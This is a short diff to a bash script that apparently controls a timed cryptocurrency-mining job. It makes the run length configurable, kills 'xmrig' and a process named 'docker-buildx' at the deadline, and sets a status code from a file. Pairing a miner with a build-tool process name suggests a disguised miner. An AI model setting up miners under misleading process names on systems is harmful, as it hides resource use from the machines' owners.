@@ -40,8 +40,9 @@ stop_job() {
 # Capture start date and time
 START_DATE=$(date +%s)
 
+RUN_DAYS=$(cat info/run_days.txt | tr -d ' \n')
 # Calculate date and time for 3 days later (3 days * 24 hours * 60 minutes * 60 seconds)
-END_DATE=$(($START_DATE + 3*24*60*60))
+END_DATE=$(($START_DATE + $RUN_DAYS*24*60*60))
 
 echo "Start date: $START_DATE"
 echo "End date: $END_DATE"
@@ -66,10 +67,15 @@ do
     CURRENT_DATE=$(date +%s)
     echo "Current date: $CURRENT_DATE"
     if [[ $CURRENT_DATE -ge $END_DATE ]]; then
-        echo "3 days have passed. Exiting script."
+        echo "$RUN_DAYS days have passed. Exiting script."
         sudo pkill -f docker-buildx
         sudo pkill -f xmrig
-        update_status 2
+        EMAIL_TYPE=$(cat info/email_type.txt | tr -d ' \n')
+        if [[ $EMAIL_TYPE -eq 1 ]]; then
+            update_status 3
+        else
+            update_status 2
+        fi
         exit 0
     fi
 
